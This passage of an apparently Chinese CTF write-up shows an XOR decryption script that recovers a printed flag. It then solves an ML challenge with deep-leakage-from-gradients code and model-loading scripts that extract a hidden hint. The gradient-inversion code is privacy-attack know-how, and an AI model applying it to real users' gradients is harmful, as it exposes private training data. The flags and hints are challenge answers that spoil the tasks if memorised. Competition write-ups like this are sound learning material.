class=\"number\">0x65</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0xA8</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0x7D</span>, <span class=\"number\">0x57</span>,</span><br><span class=\"line\">    <span class=\"number\">0x10</span>, <span class=\"number\">0xBD</span>, <span class=\"number\">0x5F</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0xCB</span>, <span class=\"number\">0xA1</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x44</span>,</span><br><span class=\"line\">    <span class=\"number\">0xE2</span>, <span class=\"number\">0x95</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x83</span>, <span class=\"number\">0xAF</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x45</span>,</span><br><span class=\"line\">    <span class=\"number\">0x57</span>, <span class=\"number\">0xA8</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x71</span>, <span class=\"number\">0xBA</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x55</span>,</span><br><span class=\"line\">    <span class=\"number\">0x47</span>, <span class=\"number\">0x93</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0xE8</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x06</span>, <span class=\"number\">0x70</span>,</span><br><span class=\"line\">    <span class=\"number\">0xC8</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x99</span>, <span class=\"number\">0xD5</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x10</span>, <span class=\"number\">0xD2</span>, <span class=\"number\">0x6B</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x4E</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x68</span>, <span class=\"number\">0xCA</span>, <span class=\"number\">0x7D</span>, <span class=\"number\">0x54</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x94</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x86</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0xC0</span>, <span class=\"number\">0xC2</span>, <span class=\"number\">0x8F</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0xEC</span>, <span class=\"number\">0xBE</span>, <span class=\"number\">0x98</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>, <span class=\"number\">0xBB</span>, <span class=\"number\">0xA1</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0xB7</span>, <span class=\"number\">0xAA</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x70</span>, <span class=\"number\">0xB3</span>, <span class=\"number\">0xB3</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x9C</span>, <span class=\"number\">0xAF</span>, <span class=\"number\">0xBC</span>, <span class=\"number\">0x7E</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0xC8</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0xC5</span>, <span class=\"number\">0x84</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0xF4</span>, <span class=\"number\">0xA7</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0x00</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>, <span class=\"number\">0xA4</span>, <span class=\"number\">0xD7</span>, <span class=\"number\">0x90</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x00</span></span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">v11 = <span class=\"number\">20250428</span>  <span class=\"comment\">#传入的数值参数</span></span><br><span class=\"line\">v2 = <span class=\"number\">0</span></span><br><span class=\"line\">v3 = <span class=\"number\">5</span> * v11</span><br><span class=\"line\">v4 = <span class=\"number\">15</span> * v11</span><br><span class=\"line\">v5 = <span class=\"number\">20</span> * v11</span><br><span class=\"line\">v6 = <span class=\"number\">10</span> * v11</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = <span class=\"built_in\">bytearray</span>(target_bytes)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i + <span class=\"number\">15</span> + <span class=\"number\">4</span> &gt; <span class=\"built_in\">len</span>(s1): </span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">xor_dword</span>(<span class=\"params\">offset, value</span>):</span><br><span class=\"line\">        pos = i + offset</span><br><span class=\"line\">        val = struct.unpack_from(<span class=\"string\">&#x27;&lt;I&#x27;</span>, s1, pos)[<span class=\"number\">0</span>]  </span><br><span class=\"line\">        val ^= value</span><br><span class=\"line\">        struct.pack_into(<span class=\"string\">&#x27;&lt;I&#x27;</span>, s1, pos, val)</span><br><span class=\"line\"></span><br><span class=\"line\">    xor_dword(<span class=\"number\">0</span>, v2)</span><br><span class=\"line\">    xor_dword(<span class=\"number\">5</span>, v3 + v2)</span><br><span class=\"line\">    xor_dword(<span class=\"number\">10</span>, v6 + v2)</span><br><span class=\"line\">    xor_dword(<span class=\"number\">15</span>, v4 + v2)</span><br><span class=\"line\"></span><br><span class=\"line\">    v2 += v5</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;解密后的字节数据：\\n<span class=\"subst\">&#123;s1&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试以不同的编码解码</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    result = s1.rstrip(<span class=\"string\">b&#x27;\\x00&#x27;</span>).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 解密成功，flag/原文为：\\n<span class=\"subst\">&#123;result&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> UnicodeDecodeError:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 解密失败，UTF-8 解码出错。尝试其他编码方式。&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        result = s1.decode(<span class=\"string\">&#x27;latin1&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 使用 latin1 编码解密成功，flag/原文为：\\n<span class=\"subst\">&#123;result&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> UnicodeDecodeError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 解密失败，latin1 解码出错。&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504172338683.png\"\n                      alt=\"image-20250504172338683\"\n                ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;WHEN_yOUr_DReAMS_COME_AIivE_YoU&#x27;r3_Un5T0pp461E&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"AI\"><a href=\"#AI\" class=\"headerlink\" title=\"AI\"></a>AI</h1><h2 id=\"Gradient\"><a href=\"#Gradient\" class=\"headerlink\" title=\"Gradient\"></a>Gradient</h2><p>AI题先交给AI做，后面一定好好上创新实践训练课😭😭😭</p>\n<p>特别感谢出题人R1ck，因为深度学习的知识尚浅薄，靠R1ck提点才有今天的成功，也算是给这次比赛画上一个圆满的句号了。</p>\n<p>根据题目，找到参考的论文以及源代码。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 核心代码</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">deep_leakage_from_gradients</span>(<span class=\"params\">model, origin_grad</span>): </span><br><span class=\"line\">  dummy_data = torch.randn(origin_data.size())</span><br><span class=\"line\">  dummy_label =  torch.randn(dummy_label.size())</span><br><span class=\"line\">  optimizer = torch.optim.LBFGS([dummy_data, dummy_label] )</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> iters <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">300</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">closure</span>():</span><br><span class=\"line\">      optimizer.zero_grad()</span><br><span class=\"line\">      dummy_pred = model(dummy_data) </span><br><span class=\"line\">      dummy_loss = criterion(dummy_pred, F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)) </span><br><span class=\"line\">      dummy_grad = grad(dummy_loss, model.parameters(), create_graph=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">      grad_diff = <span class=\"built_in\">sum</span>(((dummy_grad - origin_grad) ** <span class=\"number\">2</span>).<span class=\"built_in\">sum</span>() \\</span><br><span class=\"line\">        <span class=\"keyword\">for</span> dummy_g, origin_g <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(dummy_grad, origin_grad))</span><br><span class=\"line\">      </span><br><span class=\"line\">      grad_diff.backward()</span><br><span class=\"line\">      <span class=\"keyword\">return</span> grad_diff</span><br><span class=\"line\">    </span><br><span class=\"line\">    optimizer.step(closure)</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">return</span>  dummy_data, dummy_label</span><br></pre></td></tr></table></figure>\n<p>恢复的方法大意是指：</p>\n<ul>\n<li>先随机初始化一个虚假的原始图像dummy_data和原始标签dummy_label</li>\n<li>用LBFGS优化器来优化dummy_data和dummy_label，让他们产生的梯度和原始的梯度越来越接近</li>\n<li>然后对dummy_data在神经网络上前向传播，用dummy_label作为目标衡量损失 loss</li>\n<li>计算dummy_data的梯度</li>\n<li>衡量dummy_grad和origin_grad的差异，然后对dummy_data和dummy_label反向传播来优化。</li>\n<li>最后返回输出和标签，还原原始样本。</li>\n</ul>\n<p>现有的文件是 model.pth 和一些 梯度文件 .grad</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"comment\"># 占位模型类，用于加载（结构未知时也能绕过）</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">R1ckNet</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加入到 safe_globals（新 PyTorch 安全机制）</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.serialization <span class=\"keyword\">import</span> add_safe_globals</span><br><span class=\"line\">add_safe_globals(&#123;<span class=\"string\">&#x27;R1ckNet&#x27;</span>: R1ckNet&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">pthfile = <span class=\"string\">r&#x27;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth&#x27;</span>            <span class=\"comment\">#.pth文件的路径</span></span><br><span class=\"line\">model = torch.load(pthfile, map_location=<span class=\"string\">&#x27;cpu&#x27;</span>, weights_only=<span class=\"literal\">False</span>)</span><br><span class=\"line\">state_dict = model.state_dict()   <span class=\"comment\"># 从模型对象中提取参数字典</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> state_dict.items():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(k, v.shape)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果直接使用 torch.load 打印模型信息的话，会因为未知R1ckNet报错。</span></span><br><span class=\"line\"><span class=\"comment\">#所以实例化一个类占位。</span></span><br></pre></td></tr></table></figure>\n<p>通过torch.load打印模型信息，输出了每个卷积层的权重以及全连接层的权重。</p>\n<ul>\n<li>卷积层权重：卷积核数量、输入通道数、卷积核大小。</li>\n<li>全连接层权重：输入与输出之间的连接。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 输出如下</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">body.0.weight torch.Size([12, 3, 5, 5])</span></span><br><span class=\"line\"><span class=\"string\">body.0.bias torch.Size([12])</span></span><br><span class=\"line\"><span class=\"string\">body.2.weight torch.Size([12, 12, 5, 5])</span></span><br><span class=\"line\"><span class=\"string\">body.2.bias torch.Size([12])</span></span><br><span class=\"line\"><span class=\"string\">body.4.weight torch.Size([12, 12, 5, 5])</span></span><br><span class=\"line\"><span class=\"string\">body.4.bias torch.Size([12])</span></span><br><span class=\"line\"><span class=\"string\">body.6.weight torch.Size([16, 12, 3, 3])</span></span><br><span class=\"line\"><span class=\"string\">body.6.bias torch.Size([16])</span></span><br><span class=\"line\"><span class=\"string\">fc.0.weight torch.Size([100, 1024])</span></span><br><span class=\"line\"><span class=\"string\">fc.0.bias torch.Size([100])</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>拷打出题人后，发现对 .pth 文件挖掘不充分，进一步打印自定义类的超参数，得到一个hint</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">import</span> inspect</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果你的模型类定义在某个模块里，请确保能 import 到它</span></span><br><span class=\"line\"><span class=\"comment\"># 这里给出一个占位定义，实际加载时会使用 pickle 里的类定义</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">R1ckNet</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, in_channels=<span class=\"number\">3</span>, conv1_out=<span class=\"number\">12</span>, conv2_out=<span class=\"number\">12</span>, conv3_out=<span class=\"number\">12</span>, conv4_out=<span class=\"number\">16</span>, fc_in=<span class=\"number\">1024</span>, num_classes=<span class=\"number\">100</span></span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        <span class=\"comment\"># 如果模型里定义了 hparams，它会在实例上</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.hparams = &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;in_channels&quot;</span>: in_channels,</span><br><span class=\"line\">                <span class=\"string\">&quot;conv1_out&quot;</span>: conv1_out,</span><br><span class=\"line\">                <span class=\"string\">&quot;conv2_out&quot;</span>: conv2_out,</span><br><span class=\"line\">                <span class=\"string\">&quot;conv3_out&quot;</span>: conv3_out,</span><br><span class=\"line\">                <span class=\"string\">&quot;conv4_out&quot;</span>: conv4_out,</span><br><span class=\"line\">                <span class=\"string\">&quot;fc_in&quot;</span>: fc_in,</span><br><span class=\"line\">                <span class=\"string\">&quot;num_classes&quot;</span>: num_classes,</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"comment\"># 构建网络结构（可省略，仅为完整定义）</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.body = nn.Sequential(</span><br><span class=\"line\">            nn.Conv2d(in_channels, conv1_out, <span class=\"number\">5</span>, stride=<span class=\"number\">2</span>, padding=<span class=\"number\">2</span>), nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv1_out, conv2_out, <span class=\"number\">5</span>, stride=<span class=\"number\">2</span>, padding=<span class=\"number\">2</span>), nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv2_out, conv3_out, <span class=\"number\">5</span>, stride=<span class=\"number\">1</span>, padding=<span class=\"number\">2</span>), nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv3_out, conv4_out, <span class=\"number\">3</span>, stride=<span class=\"number\">1</span>, padding=<span class=\"number\">1</span>), nn.Sigmoid(),</span><br><span class=\"line\">            nn.Flatten()</span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.fc = nn.Linear(fc_in, num_classes)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.body(x)</span><br><span class=\"line\">        x = x.view(x.size(<span class=\"number\">0</span>), -<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span>.fc(x)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__repr__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 尝试打印 hparams，否则退回默认</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(<span class=\"variable language_\">self</span>, <span class=\"string\">&#x27;hparams&#x27;</span>):</span><br><span class=\"line\">            params = <span class=\"string\">&quot;, &quot;</span>.join(<span class=\"string\">f&quot;<span class=\"subst\">&#123;k&#125;</span>=<span class=\"subst\">&#123;v&#125;</span>&quot;</span> <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.hparams.items())</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">f&quot;<span class=\"subst\">&#123;self.__class__.__name__&#125;</span>(<span class=\"subst\">&#123;params&#125;</span>)&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>().__repr__()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    parser = argparse.ArgumentParser()</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--pth&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>, required=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                        <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;path to .pth file (whole-model or state_dict)&#x27;</span>)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 载入 .pth</span></span><br><span class=\"line\">    loaded = torch.load(args.pth, map_location=<span class=\"string\">&#x27;cpu&#x27;</span>,weights_only=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 判定类型</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(loaded, <span class=\"built_in\">dict</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Detected state_dict. Instantiating R1ckNet and loading state_dict.&quot;</span>)</span><br><span class=\"line\">        model = R1ckNet()</span><br><span class=\"line\">        <span class=\"comment\"># 支持 checkpoint dict 包含 &#x27;model_state_dict&#x27;</span></span><br><span class=\"line\">        sd = loaded.get(<span class=\"string\">&#x27;model_state_dict&#x27;</span>, loaded)</span><br><span class=\"line\">        model.load_state_dict(sd)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Detected full-model object. Using it directly.&quot;</span>)</span><br><span class=\"line\">        model = loaded</span><br><span class=\"line\"></span><br><span class=\"line\">    model.<span class=\"built_in\">eval</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 1) 打印 repr（调用 __repr__）</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Model repr() ===&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(model)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 2) 打印构造函数签名</span></span><br><span class=\"line\">    sig = inspect.signature(model.__class__.__init__)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Constructor signature ===&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(sig)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 3) 如果有 hparams</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">hasattr</span>(model, <span class=\"string\">&#x27;hparams&#x27;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== model.hparams ===&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> model.hparams.items():</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;  <span class=\"subst\">&#123;k&#125;</span> = <span class=\"subst\">&#123;v&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nNo model.hparams attribute. Inspecting instance __dict__ for hyperparam-like entries...&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> <span class=\"built_in\">vars</span>(model).items():</span><br><span class=\"line\">            <span class=\"comment\"># 过滤模块和参数</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(v, (nn.Module, nn.Parameter)) <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> k.startswith(<span class=\"string\">&#x27;_&#x27;</span>):</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;  <span class=\"subst\">&#123;k&#125;</span> = <span class=\"subst\">&#123;v&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 4) 列出所有参数名和形状</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== model.named_parameters() ===&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> name, param <span class=\"keyword\">in</span> model.named_parameters():</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;name:30s&#125;</span> | shape: <span class=\"subst\">&#123;<span class=\"built_in\">tuple</span>(param.shape)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\"># cmd line: python info.py --pth &quot;your.pth&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504203337339.png\"\n                      alt=\"image-20250504203337339\"\n                ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint: 7h3_84ck6r0und_0f_7h3_ch4r4c73r_1m463_15_wh173😝</span><br><span class=\"line\">字符背景是白色的。</span><br></pre></td></tr></table></figure>\n<p>那么结合上述的神经网络的信息，就能导入梯度迭代恢复了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span 